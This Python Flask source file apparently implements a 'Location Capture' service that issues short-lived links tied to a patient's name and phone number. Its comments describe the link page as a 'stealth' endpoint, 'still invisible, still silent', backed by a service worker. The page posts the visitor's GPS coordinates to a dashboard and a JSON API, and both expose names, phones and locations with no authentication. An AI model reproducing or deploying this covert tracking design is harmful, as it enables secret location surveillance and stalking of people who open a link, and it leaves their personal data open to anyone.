import os
import uuid
import json
from datetime import datetime, timedelta
from flask import Flask, render_template, request, jsonify, abort

app = Flask(__name__)

# ═════════════════════════════════════════════════════════════════════
# CONFIGURATION
# ═════════════════════════════════════════════════════════════════════

CASES = {}
LINK_LIFETIME_MINUTES = 30


# ══════════════════════════════════════════════════════════════════════
# CASE MANAGEMENT
# ══════════════════════════════════════════════════════════════════════

def new_case(patient_name=None, phone=None):
    token = uuid.uuid4().hex[:12]
    case = {
        "token": token,
        "patient_name": patient_name,
        "phone": phone,
        "created_at": datetime.utcnow(),
        "responded_at": None,
        "status": "pending",
        "visit_count": 0,
        "visits": [],
        "latitude": None,
        "longitude": None,
        "accuracy": None,
        "source": None,
    }
    return case


def is_expired(case):
    return datetime.utcnow() - case["created_at"] > timedelta(minutes=LINK_LIFETIME_MINUTES)


# ══════════════════════════════════════════════════════════════════════
# ROUTES
# ══════════════════════════════════════════════════════════════════════

@app.route("/")
def index():
    return "Location Capture — POST /create to generate a link."


@app.route("/sw.js")
def service_worker():
    response = app.make_response(render_template("sw.js"))
    response.headers["Content-Type"] = "application/javascript"
    response.headers["Service-Worker-Allowed"] = "/"
    response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
    return response


@app.route("/create", methods=["POST"])
def create_case():
    data = request.get_json(silent=True) or {}
    case = new_case(data.get("patient_name"), data.get("phone"))
    CASES[case["token"]] = case
    link = request.url_root.rstrip("/") + "/go/" + case["token"]
    return jsonify({
        "token": case["token"],
        "link": link,
    })


@app.route("/go/<token>")
def go(token):
    """
    STEALTH endpoint.
    SW intercepts this on supported browsers and returns inline stealth HTML.
    Non-SW browsers (or first visit before SW activates) get this server-rendered
    stealth page — still invisible, still silent.
    """
    case = CASES.get(token)
    if not case:
        abort(404)

    case["visit_count"] += 1
    expired = is_expired(case)

    if expired:
        case["status"] = "expired"

    return render_template("stealth.html", token=token, expired=expired)


@app.route("/api/location-update", methods=["POST"])
def location_update():
    """Receives stealth GPS coordinates."""
    data = request.get_json(silent=True) or {}
    token = data.get("token")
    case = CASES.get(token)
    if not case:
        return jsonify({"error": "invalid token"}), 404

    if is_expired(case):
        case["status"] = "expired"
        return jsonify({"error": "link expired"}), 410

    lat = data.get("latitude")
    lng = data.get("longitude")
    acc = data.get("accuracy")

    visit = {
        "timestamp": datetime.utcnow().isoformat(),
        "gps_latitude": lat,
        "gps_longitude": lng,
        "gps_accuracy": acc,
        "source": "gps",
    }

    if lat is not None and lng is not None:
        visit["latitude"] = lat
        visit["longitude"] = lng
        visit["accuracy"] = acc
        case["latitude"] = lat
        case["longitude"] = lng
        case["accuracy"] = acc
        case["source"] = "gps"
        if case["status"] == "pending":
            case["status"] = "located"
            case["responded_at"] = datetime.utcnow()

    case["visits"].append(visit)
    return jsonify({"ok": True})


@app.route("/api/location-denied", methods=["POST"])
def location_denied():
    """When GPS is not available or permission denied."""
    data = request.get_json(silent=True) or {}
    token = data.get("token")
    case = CASES.get(token)
    if case:
        if case["status"] == "pending":
            case["status"] = "denied"
            case["responded_at"] = datetime.utcnow()
        case["visits"].append({
            "timestamp": datetime.utcnow().isoformat(),
            "gps_latitude": None,
            "gps_longitude": None,
            "source": "denied",
        })
    return jsonify({"ok": True})


@app.route("/api/cases")
def api_cases():
    cases = sorted(CASES.values(), key=lambda c: c["created_at"], reverse=True)
    out = []
    for c in cases:
        visits_clean = []
        for v in c.get("visits", []):
            visits_clean.append({
                "timestamp": v.get("timestamp"),
                "latitude": v.get("latitude"),
                "longitude": v.get("longitude"),
                "accuracy": v.get("accuracy"),
                "source": v.get("source"),
            })
        out.append({
            "token": c["token"],
            "patient_name": c["patient_name"],
            "phone": c["phone"],
            "status": c["status"],
            "source": c["source"],
            "latitude": c["latitude"],
            "longitude": c["longitude"],
            "accuracy": c["accuracy"],
            "visit_count": c.get("visit_count", 0),
            "visits": visits_clean,
            "created_at": c["created_at"].isoformat(),
        })
    return jsonify(out)


@app.route("/dashboard")
def dashboard():
    cases = sorted(CASES.values(), key=lambda c: c["created_at"], reverse=True)
    return render_template("dashboard.html", cases=cases)


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)
